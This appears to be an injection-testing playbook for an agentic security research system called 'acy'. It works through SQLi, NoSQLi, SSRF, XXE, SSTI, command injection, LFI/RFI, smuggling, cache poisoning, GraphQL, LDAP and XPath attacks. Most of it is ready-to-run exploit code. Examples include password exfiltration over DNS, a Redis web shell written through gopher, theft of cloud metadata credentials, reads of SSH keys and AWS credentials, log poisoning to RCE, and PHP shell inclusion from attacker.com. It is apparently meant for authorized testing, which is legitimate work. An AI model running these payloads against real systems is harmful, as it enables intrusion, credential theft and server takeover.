# SKILL-INJECTION — Injection-Based Vulnerabilities
# Phase Coverage: 3-4, 7-10, 18-19, 22-24, 31-32, 38, 40-41
# Vuln Classes: SQLi, NoSQLi, SSRF, XXE, SSTI, CMDi, LFI, RFI, Smuggling,
#               Cache Poisoning, CRLF, HPP, GraphQL, LDAP, XPath
# Purpose: Server-side injection vulnerability discovery, exploitation, and chaining

---

## Phase 3: SQL Injection (SQLi) — CIA: C:H I:H A:M

```
TRIGGER: Phase 2 assigns SQLi to a surface, or JS signals DB interaction.
SURFACE TYPES: login, search, filter, user lookup, report generation, any DB-query endpoint.

TIER SYSTEM: Standard → Complex → Advanced
  STANDARD: Basic error-based, union-based, boolean/time-based blind
  COMPLEX: WAF bypass, stacked queries, second-order, out-of-band
  ADVANCED: JSON parameter injection, HTTP parameter pollution SQLi, 
            filter evasion via Unicode, HPP-based split-and-join,
            DNS exfiltration via LOAD_FILE, custom tamper chains
```

### SUB-PHASE 3.1: DISCOVERY

**Standard Discovery:**
  → Passive: mcp_burp_get_proxy_http_history_regex(regex="syntax|error|mysql|sqlite|postgresql|unrecognized|exception|warning")
  → Active: Fuzz parameter with ' " ' OR '1'='1 1 AND 1=2-- 1 UNION SELECT NULL--

**Complex Discovery:**
  → JSON parameter injection: convert GET params to JSON body and test
  → HTTP Parameter Pollution: id=1&id=' OR '1'='1 (backend concatenates)
  → Second-order: store payload in one field, trigger in another view
  → Out-of-band: DNS exfil via LOAD_FILE or xp_dirtree

**Advanced Discovery:**
  → Unicode normalization bypass: %C0%A7 (overlong encoding) → resolves to '
  → HTTP/2 header splitting causing SQLi in concatenated queries
  → GraphQL query injection through nested resolvers
  → AI/ML model prompt injection → SQL generation manipulation

### SUB-PHASE 3.2: HUNT

**Standard Error-Based:**
```bash
for char in "'" '"' "' OR '1'='1" "1 AND 1=2--" "1 UNION SELECT NULL--"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$char''',safe=''))")
  RESP=$(curl -sk "$TARGET/endpoint?id=$ENC" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -iE "syntax|error|mysql|sqlite|postgresql|unrecognized|exception"
done
```

**Standard Time-Based Blind:**
```bash
for payload in "' AND SLEEP(5)--" "'; WAITFOR DELAY '0:0:5'--" "'; SELECT pg_sleep(5)--"; do
  T=$(curl -sk -o /dev/null -w "%{time_total}" "$TARGET/endpoint?id=1$payload")
  python3 -c "t=float('$T'); exit(0 if t<4.5 else 1)" \
    || echo "[SQLI TIMING — CIA:C:H] $payload → ${T}s"
done
```

**Complex WAF Bypass Tier 1 (Whitespace/Case):**
```bash
for payload in "1'/**/UNION/**/SELECT/**/1,2,3--" "1'%0bUNiON%0bSELeCT%0b1,2,3--"; do
  RESP=$(curl -sk "$TARGET/endpoint?id=$payload" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -oE "1|2|3" | head -3
done
```

**Advanced DNS Exfiltration:**
```bash
COLLAB=$(mcp_burp_generate_collaborator_payload | grep payload_url | cut -d'"' -f4)
curl -sk "$TARGET/endpoint?id=1' AND LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.$COLLAB.'\\a.txt'))--"
mcp_burp_get_collaborator_interactions(payload_id=PAYLOAD_ID)
```

### SUB-PHASE 3.3: REPRODUCE

**Confirm:** real data extraction or authentication bypass, not just error
**PoC Script:** save to scripts/{SLUG}/sqli_{surface}.sh
**Save finding:** findings/{SLUG}/{severity}/sqli/{title}/

**CHAIN OUTPUT:**
  → SQLi error-based (low) + union-based data read → C:H chain (credentials dump)
  → SQLi + file write (INTO OUTFILE) → shell upload → RCE (critical)
  → SQLi + stacked queries → admin password change → ATO (critical)

---

## Phase 4: NoSQL Injection — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns NoSQLi to a surface, or JS signals MongoDB/Mongoose.
SURFACE TYPES: login endpoints, search, any endpoint backed by MongoDB/CouchDB/Firebase/DynamoDB.
```

### SUB-PHASE 4.2: HUNT

**Standard Operator Injection:**
```bash
for payload in \
  '{"email":"admin@t.com","password":{"$ne":""}}' \
  '{"email":{"$gt":""},"password":{"$gt":""}}' \
  '{"$where":"sleep(5000)"}'; do
  RESP=$(curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" -d "$payload")
  echo "$RESP" | grep -v "HTTP:4[0-9][0-9]"
done
```

**Advanced MongoDB $accumulator (4.4+):**
```bash
curl -sk -X POST "$TARGET/api/aggregate" -H "Content-Type: application/json" \
  -d '{
    "pipeline": [{
      "$group": {
        "_id": "$field",
        "acc": {
          "$accumulator": {
            "init": "function() { return require(\"child_process\").execSync(\"id\").toString(); }",
            "accumulate": "function(state, value) { return state; }",
            "merge": "function(s1, s2) { return s1; }",
            "lang": "js"
          }
        }
      }
    }]
  }'
```

**Advanced BSON Type Confusion:**
```bash
curl -sk -X POST "$TARGET/api/login" -H "Content-Type: application/json" \
  -d '{"email": 1, "password": 1}' -w " HTTP:%{http_code}"
# If backend does db.users.findOne({email: req.body.email}) and email is int 1,
# MongoDB matches any document where email field exists (type mismatch)
```

---

## Phase 7: SSRF — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns SSRF, or JS signals fetch(userInput), axios.get(url).
SURFACE TYPES: URL preview, import/fetch features, webhooks, PDF generators, file URL params.
```

### SUB-PHASE 7.2: HUNT

**Standard Probe Script:**
```bash
COLLAB=$(mcp_burp_generate_collaborator_payload 2>/dev/null | grep payload_url | cut -d'"' -f4)
PROBES=(
  "http://127.0.0.1/" "http://localhost/" "http://127.1/" "http://0/"
  "http://0x7f000001/" "http://2130706433/" "http://0177.0.0.1/"
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://127.0.0.1:6379/" "http://127.0.0.1:9200/" "http://127.0.0.1:8500/"
  "file:///etc/passwd" "dict://127.0.0.1:11211/stats" "gopher://127.0.0.1:6379/_INFO"
  "$COLLAB"
)
for probe in "${PROBES[@]}"; do
  RESP=$(curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/json" \
         -H "Authorization: Bearer $TOKEN" -d "{\"$PARAM\":\"$probe\"}")
  echo "$RESP" | grep -vE "HTTP:4[0-9][0-9]"
done
```

**Advanced IMDSv2 Token Theft:**
```bash
TOKEN=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" \
        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -sk -X POST "$TARGET/api/preview" -H "Content-Type: application/json" \
  -d "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\", \"headers\":{\"X-aws-ec2-metadata-token\":\"$TOKEN\"}}"
```

**Advanced Gopher/Redis Protocol Abuse:**
```bash
PAYLOAD="gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20x%20%27%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%27%0D%0ASAVE"
curl -sk -X POST "$TARGET/api/preview" -H "Content-Type: application/json" -d "{\"url\":\"$PAYLOAD\"}"
```

---

## Phase 8: XXE — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns XXE, or content-type application/xml accepted.
SURFACE TYPES: XML file upload, XML import, SOAP endpoints.
```

### SUB-PHASE 8.2: HUNT

**Classic file read:**
```bash
PAYLOAD='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" --data-binary "$PAYLOAD" | grep -q "root:x:"
```

**XInclude (when DOCTYPE blocked):**
```bash
curl -sk -X POST "$TARGET$ENDPOINT" -H "Content-Type: application/xml" \
  -H "Authorization: Bearer $TOKEN" \
  --data-binary '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
```

**SVG upload vector:**
```bash
cat > /tmp/xxe_test.svg << 'SVG'
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
SVG
curl -sk -X POST "$TARGET/upload" -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/xxe_test.svg;type=image/svg+xml" | grep "root:"
```

---

## Phase 9: SSTI — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns SSTI, or JS signals template engine references.
SURFACE TYPES: template-based rendering (email bodies, PDFs, reports, custom pages).
```

### SUB-PHASE 9.2: HUNT

**Engine fingerprinting:**
```bash
SSTI_PROBES=('{{7*7}}' '${7*7}' '#{7*7}' '<%= 7*7 %>' '*{7*7}' '{7*7}' '@(7*7)' '{{7*"7"}}')
for probe in "${SSTI_PROBES[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$probe''',safe=''))")
  RESP=$(curl -sk "$TARGET/endpoint?name=$ENC" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -oE "49|7777777" && echo "[SSTI — CIA:C:H] $probe"
done
```

**Engine-specific RCE (test after engine confirmed):**
```bash
# Jinja2:     {{cycler.__init__.__globals__.os.popen('id').read()}}
# Twig:       {{["id"]|filter("system")}}
# FreeMarker: ${"freemarker.template.utility.Execute"?new()("id")}
# ERB:        <%= `id` %>
```

---

## Phase 10: Command Injection (CMDi) — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns CMDi, or JS signals exec/spawn/child_process.
SURFACE TYPES: ping/traceroute utilities, DNS lookup tools, any feature passing input to shell.
```

### SUB-PHASE 10.2: HUNT

**Timing-based:**
```bash
CMDI_PAYLOADS=(
  "; sleep 5 #"    "| sleep 5"    '$(sleep 5)'    '`sleep 5`'
  "&& sleep 5"     "%0a sleep 5"  "%0d%0a sleep 5"
  "{sleep,5}"      "||sleep${IFS}5"
)
for payload in "${CMDI_PAYLOADS[@]}"; do
  T=$(curl -sk -o /dev/null -w "%{time_total}" -X POST "$TARGET$ENDPOINT" \
       -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
       -d "{\"$PARAM\":\"test$payload\"}")
  python3 -c "t=float('$T'); exit(0 if t<4 else 1)" \
    || echo "[CMDI TIMING — CIA:RCE] $payload → ${T}s"
done
```

**Space bypass:** {cat,/etc/passwd} | cat${IFS}/etc/passwd | cat</etc/passwd
**Keyword bypass:** c\at /etc/passwd | c'a't /etc/passwd
**Base64:** echo 'aWQ=' | base64 -d | sh

---

## Phase 18: Path Traversal / LFI — CIA: C:H

```
TRIGGER: Phase 2 assigns LFI, or JS signals /api/file?name=, /view?page=.
SURFACE TYPES: file download, include/template endpoints, image serving, any ?file= or ?path= param.
```

### SUB-PHASE 18.2: HUNT

**Classic traversal:**
```bash
LFI_TARGETS=("../../../etc/passwd" "../../../../etc/passwd" "../../../etc/shadow"
  "~/.ssh/id_rsa" "~/.aws/credentials" "../../../var/www/html/.env" "../../../app/.env"
  "/proc/self/environ" "/proc/self/cmdline" "WEB-INF/web.xml" "C:\\Windows\\win.ini")
for target in "${LFI_TARGETS[@]}"; do
  ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$target''',safe=''))")
  RESP=$(curl -sk "$TARGET/api/file?path=$ENC" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -qE "root:x:|aws_access|BEGIN RSA|APP_KEY|\[boot loader\]" \
    && echo "[LFI — CIA:C:H] $target"
done
```

**Filter bypass:**
```bash
for bypass in "....//....//etc/passwd" "..././..././etc/passwd" \
  "%2e%2e%2f%2e%2e%2fetc%2fpasswd" "..%252f..%252fetc%252fpasswd" \
  "..%c0%af..%c0%afetc%2fpasswd" "../../../../etc/passwd%00.jpg"; do
  RESP=$(curl -sk "$TARGET/view?page=$bypass" -H "Authorization: Bearer $USER1_TOKEN")
  echo "$RESP" | grep -q "root:x:" && echo "[LFI bypass — CIA:C:H] $bypass"
done
```

**PHP wrappers:**
```bash
for wrapper in "php://filter/convert.base64-encode/resource=index.php" \
  "php://filter/read=string.rot13/resource=config.php"; do
  RESP=$(curl -sk "$TARGET/view?page=$wrapper" -H "Authorization: Bearer $USER1_TOKEN")
  [[ -n "$RESP" ]] && echo "[PHP WRAPPER] $wrapper"
done
```

**Log poisoning → RCE (chain with CMDi):**
```bash
curl -sk "$TARGET/" -A "<?php system(\$_GET['cmd']); ?>" -o /dev/null
curl -sk "$TARGET/view?page=../../../../var/log/apache2/access.log&cmd=id" | grep -v "PHP"
```

---

## Phase 19: RFI — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns RFI, or PHP app detected with allow_url_include potential.
SURFACE TYPES: PHP applications with allow_url_include=On.
```

### SUB-PHASE 19.2: HUNT

```bash
# Requires allow_url_include=On (PHP) — check if enabled first via LFI
# /proc/self/environ → PHP_INI_SCAN_DIR or phpinfo.php → allow_url_include = On
for rfi in "http://attacker.com/shell.php" "ftp://attacker.com/shell.php"; do
  curl -sk "$TARGET/view?page=$rfi" -H "Authorization: Bearer $USER1_TOKEN" | head -3
done
# If allow_url_include=Off → NOT exploitable → log as DEAD_END in KB, do not report
# If On → critical finding → chain with CMDI/RCE for full server compromise
```

---

## Phase 22: HTTP Request Smuggling — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns smuggling, or load-balanced/reverse-proxy infrastructure detected.
SURFACE TYPES: load-balanced apps, reverse proxy setups (nginx + backend, CDN + origin).
```

### SUB-PHASE 22.2: HUNT

**CL.TE probe:**
```bash
mcp_burp_send_http1_request(
  host="target.com", port=443, use_https=True,
  request="POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
)
```

**TE obfuscation variants:**
```bash
# "Transfer-Encoding: xchunked"
# "Transfer-Encoding : chunked"  (space before colon)
# "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"
```

**Automated detection:**
```bash
python3 /opt/smuggler/smuggler.py -u $TARGET/ -l 2 --no-color 2>&1 | tee ~/agents/acy/fullrecon/${SLUG}/smuggling.txt
```

---

## Phase 23: Web Cache Poisoning — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns cache-poisoning, or CDN headers detected (cf-ray, x-cache).
SURFACE TYPES: pages served via CDN (Cloudflare, Fastly, Akamai, CloudFront).
```

### SUB-PHASE 23.2: HUNT

**Unkeyed header reflection:**
```bash
UNKEYED_HEADERS=("X-Forwarded-Host" "X-Forwarded-For" "X-Forwarded-Scheme"
  "X-Host" "X-Original-URL" "X-Rewrite-URL" "Origin" "Forwarded")
for h in "${UNKEYED_HEADERS[@]}"; do
  RESP=$(curl -sk "$TARGET/" -H "$h: evil.com" -H "Cache-Control: no-cache")
  echo "$RESP" | grep -qi "evil.com" && echo "[CACHE POISON CANDIDATE — CIA:C:H] $h reflected"
done
```

**XSS via cache poisoning:**
```bash
curl -sk "$TARGET/" \
  -H 'X-Forwarded-Host: attacker.com"><script>console.log(1)</script>' \
  -H "Cache-Control: no-cache" | grep -i "attacker.com"
```

**Fat GET:**
```bash
curl -sk -X GET "$TARGET/api/endpoint?param=normal" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "param=evil"
```

---

## Phase 24: Web Cache Deception — CIA: C:H

```
TRIGGER: Phase 2 assigns cache-deception, or app serves auth content on static-looking paths.
```

### SUB-PHASE 24.2: HUNT

```bash
CACHE_PATHS=(".css" ".js" ".png" ".ico" ".woff" ".jpg" ".gif" ".svg")
SENSITIVE_ENDPOINTS=("/account/settings" "/profile" "/api/user/me" "/dashboard" "/api/orders")
for endpoint in "${SENSITIVE_ENDPOINTS[@]}"; do
  for ext in "${CACHE_PATHS[@]}"; do
    RESP=$(curl -sk -w " HTTP:%{http_code}" "$TARGET${endpoint}${ext}" \
           -H "Authorization: Bearer $USER1_TOKEN")
    echo "$RESP" | grep "HTTP:200" | grep -qiE "email|token|user|password|credit|balance" \
      && echo "[CACHE DECEPTION — CIA:C:H] ${endpoint}${ext} returns auth data"
  done
done
```

---

## Phase 31: HTTP Parameter Pollution (HPP) — CIA: I:M

```
TRIGGER: Phase 2 assigns parameter-pollution, or WAF bypass needed.
```

### SUB-PHASE 31.2: HUNT

```bash
# WAF bypass
curl -sk "$TARGET/search?q=SAFE&q='; DROP TABLE users--" -H "Authorization: Bearer $USER1_TOKEN"
curl -sk "$TARGET/api/user?role=user&role=admin" -H "Authorization: Bearer $USER1_TOKEN" | jq .role

# Logic bypass (WAF sees first, backend uses last)
curl -sk -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $USER1_COOKIE" \
  -d "amount=1000&amount=0.01"

# Framework parsing test
curl -sk "$TARGET/api/test?a=1&a=2" -H "Authorization: Bearer $USER1_TOKEN" | jq .
# PHP: last | Node: array | ASP.NET: joined with comma | Flask: first
```

---

## Phase 32: GraphQL Security — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns graphql, or JS signals Apollo, urql, gql.
SURFACE TYPES: GraphQL endpoints (/graphql, /api/graphql, /gql, /query).
```

### SUB-PHASE 32.2: HUNT

**Endpoint discovery:**
```bash
for path in "/graphql" "/api/graphql" "/v1/graphql" "/gql" "/query" "/graphiql"; do
  S=$(curl -sk -w "%{http_code}" -X POST "$TARGET$path" \
       -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -o /dev/null)
  [[ "$S" == "200" ]] && echo "[GRAPHQL ENDPOINT] $TARGET$path"
done
```

**Introspection:**
```bash
GQL_ENDPOINT="$TARGET/graphql"
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER1_TOKEN" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name } } } } }"}' \
  | jq . > ~/agents/acy/fullrecon/${SLUG}/gql_schema.json
```

**Alias batching (rate limit bypass → brute force):**
```bash
python3 - << 'EOF'
import requests, json, os
TARGET = os.environ.get('TARGET', '')
aliases = "\n".join(f'a{i}: login(email:"test{i}@t.com",password:"pass{i}") {{ token }}' for i in range(50))
r = requests.post(f"{TARGET}/graphql",
    headers={"Content-Type":"application/json","Authorization":f"Bearer {os.environ.get('USER1_TOKEN','')}"},
    json={"query": f"mutation {{ {aliases} }}"}, timeout=15)
print(r.status_code, r.text[:500])
EOF
```

**Authorization bypass via nesting:**
```bash
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER1_TOKEN" \
  -d '{"query":"{ publicPost(id: 1) { author { adminNotes privateData } } }"}' | jq .
```

---

## Phase 38: CRLF Injection — CIA: I:M

```
TRIGGER: Phase 2 assigns crlf, or redirect endpoints/URL-reflecting responses detected.
```

### SUB-PHASE 38.2: HUNT

```bash
for payload in \
  "%0d%0aSet-Cookie:%20sessionid=attacker_injected" \
  "%0d%0aX-Injected:%20evil" \
  "%0d%0a%0d%0a<html><script>console.log(1)</script>" \
  "%0aX-Header:%20injected"; do
  RESP=$(curl -sk -D - "$TARGET/redirect?url=/page$payload" -o /dev/null)
  echo "$RESP" | grep -iE "Set-Cookie.*attacker|X-Injected|^attacker" \
    && echo "[CRLF — CIA:I:M] $payload"
done
```

---

## Phase 40: LDAP Injection — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns ldap, or JS signals ldap, activedirectory, ldapjs.
SURFACE TYPES: LDAP-backed login, directory search, corporate SSO, Active Directory auth.
```

### SUB-PHASE 40.2: HUNT

**Auth bypass:**
```bash
# Normal: (&(uid=USER)(password=PASS))
# Inject: admin)(&  → (&(uid=admin)(&)(password=x)) → matches admin
for inject in "admin)(&" "*" "admin)|(uid=*" "*)(uid=*))(|(uid=*"; do
  curl -sk -X POST "$TARGET/api/ldap-login" -H "Content-Type: application/json" \
    -d "{\"username\":\"$inject\",\"password\":\"x\"}" | jq . | head -5
done
```

**Blind enumeration:**
```bash
for attr in "description" "mail" "telephoneNumber" "memberOf" "sAMAccountName"; do
  R=$(curl -sk -o /dev/null -w "%{size_download}" \
       "$TARGET/api/ldap-search?q=admin)(|($attr=*))(uid=*")
  echo "$attr → $R bytes"
done
```

---

## Phase 41: XPath Injection — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns xpath, or JS signals xpath, XPathEvaluator.
SURFACE TYPES: XML-backed auth, XML data stores, SOAP services.
```

### SUB-PHASE 41.2: HUNT

**Auth bypass:**
```bash
# Normal: //users/user[name/text()='USER' and password/text()='PASS']
# Inject: ' or '1'='1
for inject in "' or '1'='1" "' or 1=1 or '1'='1" "'] | //user | a['"; do
  curl -sk -X POST "$TARGET/api/xml-login" -H "Content-Type: application/json" \
    -d "{\"username\":\"$inject\",\"password\":\"x\"}" -w " HTTP:%{http_code}"
done
```

**Blind XPath — extract char by char:**
```bash
for i in $(seq 1 20); do
  for c in {a..z} {0..9}; do
    inject="' and substring(//user[1]/password/text(),$i,1)='$c' and '1'='1"
    RESP=$(curl -sk "$TARGET/api?user=$inject")
    [[ "$RESP" == *"Welcome"* ]] && echo "Char $i: $c" && break
  done
done
```

---

*SKILL-INJECTION — Injection-Based Vulnerabilities Module*
*Part of the acy Agentic Security Research System*
